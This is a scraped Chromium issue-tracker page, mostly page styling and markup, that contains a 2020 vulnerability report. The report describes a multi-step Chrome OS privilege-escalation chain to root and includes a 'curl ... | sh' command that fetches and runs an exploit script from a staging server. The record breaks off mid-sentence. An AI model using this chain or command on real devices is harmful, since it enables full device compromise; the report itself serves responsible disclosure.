 if (newWindow)
 window.open(url, '_blank');
 else
 document.location = url;

 var loadQueue = [];
 function runOnLoad(fn) { loadQueue.push(fn); }
 window.onload = function() {
 for (var i = 0; i < loadQueue.length; i++)
 loadQueue[i]();
 delete loadQueue;

  :host {
    --mr-edit-field-padding: 0.125em 4px;
    --mr-edit-field-width: 90%;
    --mr-input-grid-gap: 6px;
    font-family: var(--chops-font-family);
    color: var(--chops-primary-font-color);
    font-size: var(--chops-main-font-size);
  }
  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;
    margin-top: 0.25em;
    border-bottom: var(--chops-normal-border);
  }
  .medium-heading chops-button {
    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;
    grid-gap: var(--mr-input-grid-gap);
    grid-template-columns: minmax(120px, max-content) 1fr;
    align-items: flex-start;
  }
  .input-grid label {
    font-weight: bold;
    text-align: right;
    word-wrap: break-word;
  }
  @media (max-width: 600px) {
    .input-grid label {
      margin-top: var(--mr-input-grid-gap);
      text-align: left;
    }
    .input-grid {
      grid-gap: var(--mr-input-grid-gap);
      grid-template-columns: 100%;
    }
  }

        mr-app {
          display: block;
          padding-top: var(--monorail-header-height);
          margin-top: -1px; /* Prevent a double border from showing up. */

          /* From shared-styles.js. */
          --mr-edit-field-padding: 0.125em 4px;
          --mr-edit-field-width: 90%;
          --mr-input-grid-gap: 6px;
          font-family: var(--chops-font-family);
          color: var(--chops-primary-font-color);
          font-size: var(--chops-main-font-size);
        }
        main {
          border-top: var(--chops-normal-border);
        }
        .snackbar-container {
          position: fixed;
          bottom: 1em;
          left: 1em;
          display: flex;
          flex-direction: column;
          align-items: flex-start;
          z-index: 1000;
        }
        /** Unfix <chops-snackbar> to allow stacking. */
        chops-snackbar {
          position: static;
          margin-top: 0.5em;
        }
        .project-alert {
          background: var(--chops-orange-50);
          color: var(--chops-field-error-color);
          display: block;
          font-weight: bold;
          text-align: center;
        }

        <h2>
          Issue tracker keyboard shortcuts
          <button class="close-button">
            Close
          </button>

              <span></span>Issue list<span class="help-title"><!---->Issue list<!----></span>
              
                
                  
                    k<kbd><!---->k<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    j<kbd><!---->j<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->k<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->j<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                up/down in the list<span class="key-tip"><!---->up/down in the list<!----></span>
              
                
                  
                    o<kbd><!---->o<!----></kbd>
                     / <span class="key-separator"> / </span>
                  
                    Enter<kbd><!---->Enter<!----></kbd>
                     / <span class="key-separator" hidden=""> / </span>
                  :
                <span class="key-shortcut">
                  <!---->
                    <kbd><!---->o<!----></kbd>
                    <span class="key-separator"> / </span>
                  <!---->
                    <kbd><!---->Enter<!----></kbd>
                    <span class="key-separator" hidden=""> / </span>
                  <!---->:
                </span>
                open the current issue<span class="key-tip"><!---->open the current issue<!----></span>

    <mr-cue centered="" cueprefname="search_for_numbers" hidden=""></mr-cue>
      
          
      
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>
      
      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>

        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

          BlockedOn:<h3>BlockedOn:</h3>

        Description #1 by kerrnel@chromium.org (Sep 28, 2020)
      <option value="0" selected="">

      <div class="select-container">
        <select aria-label="Description history menu" hidden="">

      <option value="0" selected="">
        Description #1 by kerrnel@chromium.org (Sep 28, 2020)
      </option>
    <!---->
        </select>

      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>The shill-scripts user can be compromised to avoid chronos process termination on logout, allowing malicious code to exploit a post-logout chronos arbitrary directory chown. Arc-setup can be tricked into performing a root arbitrary file write to set the uid_map of a user namespace to obtain uid 0, which can be utilized to restart an upstart service with controlled variables to escalate to full root in the init namespace.<span class="line"><!---->The shill-scripts user can be compromised to avoid chronos process termination on logout, allowing malicious code to exploit a post-logout chronos arbitrary directory chown. Arc-setup can be tricked into performing a root arbitrary file write to set the uid_map of a user namespace to obtain uid 0, which can be utilized to restart an upstart service with controlled variables to escalate to full root in the init namespace.<!----></span><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Google Chrome  85.0.4183.131 (Official Build) (64-bit)<span class="line"><!---->Google Chrome  85.0.4183.131 (Official Build) (64-bit)<!----></span><br>Platform 13310.91.0 (Official Build) stable-channel eve<span class="line"><!---->Platform 13310.91.0 (Official Build) stable-channel eve<!----></span><br>Firmware Version Google_Eve.9584.201.0<span class="line"><!---->Firmware Version Google_Eve.9584.201.0<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>It is necessary for termina to be installed prior to exploitation, manually starting Terminal once will be satisfactory. This step should be scriptable but has not been to simplify the PoC.<span class="line"><!---->It is necessary for termina to be installed prior to exploitation, manually starting Terminal once will be satisfactory. This step should be scriptable but has not been to simplify the PoC.<!----></span><br><br><br>A staging server is used to retrieve the assets for this script. It is not necessary for exploitation but has been used to simplify the poc. HTTPSERVER in run.sh should be updated to reflect it's location. An HTTP server is required, I'm just using 'python2 -m SimpleHTTPServer' inside the directory containing exploit.obb.<span class="line"><!---->A staging server is used to retrieve the assets for this script. It is not necessary for exploitation but has been used to simplify the poc. HTTPSERVER in run.sh should be updated to reflect it's location. An HTTP server is required, I'm just using 'python2 -m SimpleHTTPServer' inside the directory containing exploit.obb.<!----></span><br><br>When the server is running the exploit script can be executed with curl and sh:<span class="line"><!---->When the server is running the exploit script can be executed with curl and sh:<!----></span><br><br>curl <span class="line"><!---->curl <!----></span>http://172.16.2.72:8000/run.sh<a class="undefined" target="_blank" href="http://172.16.2.72:8000/run.sh"><!---->http://172.16.2.72:8000/run.sh<!----></a> | sh<span class="line"><!----> | sh<!----></span><br><br>The script will trigger a logout shortly after start. When exploitation is complete, a click sound will be played through the speakers, indicating that exploitation was successful and that sshd is now running on port 1337 with keys in /tmp/ssh_host_rsa_key.<span class="line"><!---->The script will trigger a logout shortly after start. When exploitation is complete, a click sound will be played through the speakers, indicating that exploitation was successful and that sshd is now running on port 1337 with keys in /tmp/ssh_host_rsa_key.<!----></span><br><br>From execution of curl to the completion notification is about 1 minute 10 seconds on my machine. This could be shortened by replacing sleeps with code to detect what they're waiting for (not done to simplify the poc).<span class="line"><!---->From execution of curl to the completion notification is about 1 minute 10 seconds on my machine. This could be shortened by replacing sleeps with code to detect what they're waiting for (not done to simplify the poc).<!----></span><br><br>DETAILS<span class="line"><!---->DETAILS<!----></span><br>=== Arbitrary source bind mount ===<span class="line"><!---->=== Arbitrary source bind mount ===<!----></span><br>By adding the 'bind' option to a dbus call to CrosDisks.Mount when mounting an sshfs URI it is possible to bind mount an arbitrary directory to under /media/fuse. The provided URI has its handler stripped which can result in a real path on the system, e.g sshfs:///run will result in a call to mount(2) with /run as it's first argument.<span class="line"><!---->By adding the 'bind' option to a dbus call to CrosDisks.Mount when mounting an sshfs URI it is possible to bind mount an arbitrary directory to under /media/fuse. The provided URI has its handler stripped which can result in a real path on the system, e.g sshfs:///run will result in a call to mount(2) with /run as it's first argument.<!----></span><br><br>This bind mount persists until the sshfs binary executed after the mount fails, due to the invalid sshfs host value, and returns. However, the fuse umount is not forced by cros-disks [2]. A race condition occurs wherein a process can change directories into the newly bind mounted directory before it is unmounted, which causes the unmount to fail, and the mount point to no longer be tracked by cros-disks.<span class="line"><!---->This bind mount persists until the sshfs binary executed after the mount fails, due to the invalid sshfs host value, and returns. However, the fuse umount is not forced by cros-disks [2]. A race condition occurs wherein a process can change directories into the newly bind mounted directory before it is unmounted, which causes the unmount to fail, and the mount point to no longer be tracked by cros-disks.<!----></span><br><br>This can be done with bash by looping on the CrosDisks.Mount and concurrently attempting to 'cd' into the new mount directory until successful.<span class="line"><!---->This can be done with bash by looping on the CrosDisks.Mount and concurrently attempting to 'cd' into the new mount directory until successful.<!----></span><br><br>The mount target directory can be controlled with the mountlabel= cros-disks option, and this allows for the bind mount of /run to /media/fuse/crostini_XXX_termina_penguin<span class="line"><!---->The mount target directory can be controlled with the mountlabel= cros-disks option, and this allows for the bind mount of /run to /media/fuse/crostini_XXX_termina_penguin<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#262<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#262"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#262<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#467<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#467"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/fuse_mounter.cc#467<!----></a><br><br>=== Obb exec mount ===<span class="line"><!---->=== Obb exec mount ===<!----></span><br>ArcObbMounter mounts .obb files into /var/run/arc without the noexec flag. [1]<span class="line"><!---->ArcObbMounter mounts .obb files into /var/run/arc without the noexec flag. [1]<!----></span><br><br>By sharing the PlayFiles location with the Termina VM, and writing a file into the /mnt/chromeos/PlayFiles/Music directory inside the VM, an attacker supplied .obb file can be made available to the arc-obb-mounter mount namespace under /data/media/0/Music/.<span class="line"><!---->By sharing the PlayFiles location with the Termina VM, and writing a file into the /mnt/chromeos/PlayFiles/Music directory inside the VM, an attacker supplied .obb file can be made available to the arc-obb-mounter mount namespace under /data/media/0/Music/.<!----></span><br><br>ArcObbMounterInterface.MountObb takes a signed integer to specify the gid offset for which to mount the obb file. By specifying an offset of -654360 it is possible to mount an obb file which is then readable by gid chronos (1000) outside of ARC. [2]<span class="line"><!---->ArcObbMounterInterface.MountObb takes a signed integer to specify the gid offset for which to mount the obb file. By specifying an offset of -654360 it is possible to mount an obb file which is then readable by gid chronos (1000) outside of ARC. [2]<!----></span><br><br>While the permissions of the mounted files do not include the executable bit, this is not necessary to load a shared object with LD_PRELOAD. This can therefore be used to gain arbitrary code execution.<span class="line"><!---->While the permissions of the mounted files do not include the executable bit, this is not necessary to load a shared object with LD_PRELOAD. This can therefore be used to gain arbitrary code execution.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount_obb_fuse_main.cc#225<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount_obb_fuse_main.cc#225"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount_obb_fuse_main.cc#225<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount.cc#60<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount.cc#60"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/obb-mounter/mount.cc#60<!----></a><br><br>=== RunShillScriptStart arbitrary command execution ==<span class="line"><!---->=== RunShillScriptStart arbitrary command execution ==<!----></span><br>The host validation performed by network_diag does not take into account multiple lines of input. If a single valid line is specified, followed by a malicious line, the grep returns true and the input is considered a valid host. [1]<span class="line"><!---->The host validation performed by network_diag does not take into account multiple lines of input. If a single valid line is specified, followed by a malicious line, the grep returns true and the input is considered a valid host. [1]<!----></span><br><br>By calling the debugd.RunShillScriptStart dbus endpoint with a multiline argument, it is possible to gain arbitrary command execution as shill-scripts inside the debugd mount namespace. [2]<span class="line"><!---->By calling the debugd.RunShillScriptStart dbus endpoint with a multiline argument, it is possible to gain arbitrary command execution as shill-scripts inside the debugd mount namespace. [2]<!----></span><br><br>The debugd.RunShillScriptStart takes a file descriptor as a parameter, to write the output of the network_diag tool. By passing in a memfd copy of the .so loaded from the obb file, the shill-scripts command execution can also use LD_PRELOAD to obtain arbitrary code execution via /proc/self/fd/2.<span class="line"><!---->The debugd.RunShillScriptStart takes a file descriptor as a parameter, to write the output of the network_diag tool. By passing in a memfd copy of the .so loaded from the obb file, the shill-scripts command execution can also use LD_PRELOAD to obtain arbitrary code execution via /proc/self/fd/2.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#1111<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#1111"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#1111<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#55<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#55"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/crosh/network_diag#55<!----></a><br><br><br>=== chronos dbus impersonation ===<span class="line"><!---->=== chronos dbus impersonation ===<!----></span><br>dbus validates the caller user's identity using SCM_CREDENTIALS during the initial handshake of the dbus protocol, but does not do so for any future RPC calls. The chronos user can connect to the dbus socket and authenticate legitimately, and then pass the now-authenticated unix socket over another unix socket (via SCM_RIGHTS) connected to the arbitrary code execution under shill-scripts. This will allow the shill-scripts code execution to call dbus functions as chronos.<span class="line"><!---->dbus validates the caller user's identity using SCM_CREDENTIALS during the initial handshake of the dbus protocol, but does not do so for any future RPC calls. The chronos user can connect to the dbus socket and authenticate legitimately, and then pass the now-authenticated unix socket over another unix socket (via SCM_RIGHTS) connected to the arbitrary code execution under shill-scripts. This will allow the shill-scripts code execution to call dbus functions as chronos.<!----></span><br><br>Upon logout, all chronos processes are terminated. Exploitation of shill-scripts and chronos dbus impersonation allows for code and access persistence even after the user session has ended (ie on the login screen)<span class="line"><!---->Upon logout, all chronos processes are terminated. Exploitation of shill-scripts and chronos dbus impersonation allows for code and access persistence even after the user session has ended (ie on the login screen)<!----></span><br><br><br>=== chronos:chronos arbitrary chown ===<span class="line"><!---->=== chronos:chronos arbitrary chown ===<!----></span><br>During chrome start, at this stage for a login prompt, /home/chronos/Default is ensured to exist and chronos ownership is applied by login_manager [1].<span class="line"><!---->During chrome start, at this stage for a login prompt, /home/chronos/Default is ensured to exist and chronos ownership is applied by login_manager [1].<!----></span><br><br><br>The EnsureDirectoryExists function uses base::DirectoryExists and will recreate as a directory if a non-directory is detected. However, base::DirectoryExists uses stat rather than lstat internally, and therefore EnsureDirectoryExists can be tricked into traversing a symbolic link and changing ownership of an arbitrary directory to chronos:chronos.<span class="line"><!---->The EnsureDirectoryExists function uses base::DirectoryExists and will recreate as a directory if a non-directory is detected. However, base::DirectoryExists uses stat rather than lstat internally, and therefore EnsureDirectoryExists can be tricked into traversing a symbolic link and changing ownership of an arbitrary directory to chronos:chronos.<!----></span><br><br>This is used to take ownership of /run<span class="line"><!---->This is used to take ownership of /run<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/login_manager/chrome_setup.cc#269<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/login_manager/chrome_setup.cc#269"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/login_manager/chrome_setup.cc#269<!----></a><br>[2] <span class="line"><!---->[2] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/libchromeos-ui/chromeos/ui/util.cc#57<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/libchromeos-ui/chromeos/ui/util.cc#57"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/libchromeos-ui/chromeos/ui/util.cc#57<!----></a><br><br>=== shill-scripts to chronos file access ==<span class="line"><!---->=== shill-scripts to chronos file access ==<!----></span><br>With shill-scripts' ability to impersonate chronos over dbus, a new Seneschal/9s server can be started. Utilizing the bind mount from the first step, user 'XXX's LinuxFiles storage directory is shared with the new Seneschal server [1]. This allows the shill-scripts user to access files as the chronos user via the 9p protocol, over the unix socket passed to Seneschal.StartServer.<span class="line"><!---->With shill-scripts' ability to impersonate chronos over dbus, a new Seneschal/9s server can be started. Utilizing the bind mount from the first step, user 'XXX's LinuxFiles storage directory is shared with the new Seneschal server [1]. This allows the shill-scripts user to access files as the chronos user via the 9p protocol, over the unix socket passed to Seneschal.StartServer.<!----></span><br><br>Since /run is now owned by chronos, this allows shill-scripts to perform modifications to /run.<span class="line"><!---->Since /run is now owned by chronos, this allows shill-scripts to perform modifications to /run.<!----></span><br><br>(note that p9 interactions are done via the included Golang code, due to the simplicity of the p9 library)<span class="line"><!---->(note that p9 interactions are done via the included Golang code, due to the simplicity of the p9 library)<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/vm_tools/seneschal/service.cc#813<a class="undefined" target="_blank" href="https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/vm_tools/seneschal/service.cc#813"><!---->https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/vm_tools/seneschal/service.cc#813<!----></a><br><br>=== arc-setup arbitrary file write ===<span class="line"><!---->=== arc-setup arbitrary file write ===<!----></span><br>During arc-setup, the ApplyPerBoardConfigurationsInternal function attempts to copy the media_profiles.xml to /run/arc/oem/etc/media_profiles.xml. [1]<span class="line"><!---->During arc-setup, the ApplyPerBoardConfigurationsInternal function attempts to copy the media_profiles.xml to /run/arc/oem/etc/media_profiles.xml. [1]<!----></span><br><br>The source of media_profiles.xml is obtained by reading chromeos-config, which is mounted under /run. Since /run/chromeos-config is a standard directory, under which the config directories (v1 and private) are mounted, shill-scripts can rename chromeos-config, moving the read-only mounted child directories out of the way, and recreate the directory structure containing arbitrary configuration.<span class="line"><!---->The source of media_profiles.xml is obtained by reading chromeos-config, which is mounted under /run. Since /run/chromeos-config is a standard directory, under which the config directories (v1 and private) are mounted, shill-scripts can rename chromeos-config, moving the read-only mounted child directories out of the way, and recreate the directory structure containing arbitrary configuration.<!----></span><br><br>The /run/chromeos-config/v1/arc/media-profiles/system-path file is created containing the path to a fifo in /tmp created earlier. This is the path that arc-setup will use as the source of the file copy [2].<span class="line"><!---->The /run/chromeos-config/v1/arc/media-profiles/system-path file is created containing the path to a fifo in /tmp created earlier. This is the path that arc-setup will use as the source of the file copy [2].<!----></span><br><br>The destination of the file copy is /run/arc/oem/etc/media_profiles.xml. There is no validation that this file is not a symbolic link, so as above the /run/arc directory can be renamed, and the directory structure can be re-created to contain a symbolic link at the appropriate path. Since the 9p protocol as implemented by the 9s server does not include functionality to create a symbolic link, a previously created symbolic link placed in /run/chrome (a chronos-writable location) is moved to the correct location and name.<span class="line"><!---->The destination of the file copy is /run/arc/oem/etc/media_profiles.xml. There is no validation that this file is not a symbolic link, so as above the /run/arc directory can be renamed, and the directory structure can be re-created to contain a symbolic link at the appropriate path. Since the 9p protocol as implemented by the 9s server does not include functionality to create a symbolic link, a previously created symbolic link placed in /run/chrome (a chronos-writable location) is moved to the correct location and name.<!----></span><br><br>The target of the symbolic link is the uid_map of a newly created user namespace, created by the shill-scripts code. Since arc-setup is running as root, by writing an appropriate uid mapping into the fifo the shill-scripts code execution is elevated to the root user in the init namespace.<span class="line"><!---->The target of the symbolic link is the uid_map of a newly created user namespace, created by the shill-scripts code. Since arc-setup is running as root, by writing an appropriate uid mapping into the fifo the shill-scripts code execution is elevated to the root user in the init namespace.<!----></span><br><br>At this time the code is uid 0 with no capabilities, inside a user namespace and the debugd mount 